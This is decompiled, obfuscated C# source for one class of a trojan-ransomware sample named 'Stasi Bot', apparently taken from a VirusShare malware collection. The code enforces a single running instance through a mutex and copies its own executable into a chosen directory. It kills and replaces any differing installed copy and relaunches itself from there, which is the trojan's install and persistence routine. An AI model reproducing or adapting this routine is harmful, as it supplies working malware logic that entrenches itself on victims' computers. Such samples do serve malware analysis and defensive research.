// Decompiled with JetBrains decompiler
// Type: ?3?
// Assembly: Stasi Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5CBE163B-B93A-4B20-A7D0-9D33961B8040
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Ransom.Win32.Blocker.hefc-d761814a3881cda5552583bb55f86ecca16438332641b4ca511b957946e6659b.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

internal class \u003F3\u003F
{
  private string \u003F11\u003F;
  private string \u003F66\u003F;

  public \u003F3\u003F(string _param1, string _param2)
  {
    this.\u003F11\u003F = _param2;
    this.\u003F66\u003F = _param1;
  }

  public bool \u003F18\u003F(string _param1)
  {
    try
    {
      Mutex.OpenExisting(_param1);
      return false;
    }
    catch
    {
      Mutex mutex = new Mutex(true, _param1);
      return true;
    }
  }

  public void \u003F19\u003F()
  {
    if (!(Environment.CurrentDirectory != this.\u003F66\u003F))
      return;
    string str = this.\u003F20\u003F(Process.GetCurrentProcess().MainModule.FileName);
    if (File.Exists(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F))
    {
      if (this.\u003F20\u003F(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F) != str)
      {
        try
        {
          Process[] processes = Process.GetProcesses();
          try
          {
            foreach (Process process in processes)
            {
              if (process.MainModule.FileName == this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F)
                process.Kill();
            }
          }
          catch
          {
          }
          File.SetAttributes(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F, FileAttributes.Normal);
          File.Delete(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F);
          File.Copy(Process.GetCurrentProcess().MainModule.FileName, this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F);
          Process.Start(new ProcessStartInfo(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F)
          {
            WorkingDirectory = this.\u003F66\u003F
          });
          Environment.Exit(0);
        }
        catch
        {
        }
      }
      else
      {
        Process.Start(new ProcessStartInfo(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F)
        {
          WorkingDirectory = this.\u003F66\u003F
        });
        Environment.Exit(0);
      }
    }
    else
    {
      try
      {
        if (!Directory.Exists(this.\u003F66\u003F))
          Directory.CreateDirectory(this.\u003F66\u003F);
        File.Copy(Process.GetCurrentProcess().MainModule.FileName, this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F);
        Process.Start(new ProcessStartInfo(this.\u003F66\u003F + \u003F78\u003F.\u003F79\u003F("]") + this.\u003F11\u003F)
        {
          WorkingDirectory = this.\u003F66\u003F
        });
        Environment.Exit(0);
      }
      catch
      {
      }
    }
  }

  private string \u003F20\u003F(string _param1)
  {
    try
    {
      MD5CryptoServiceProvider cryptoServiceProvider = new MD5CryptoServiceProvider();
      FileStream inputStream = new FileStream(_param1, FileMode.Open, FileAccess.Read);
      byte[] hash = cryptoServiceProvider.ComputeHash((Stream) inputStream);
      inputStream.Close();
      return BitConverter.ToString(hash);
    }
    catch (Exception ex)
    {
      throw ex;
    }
  }
}
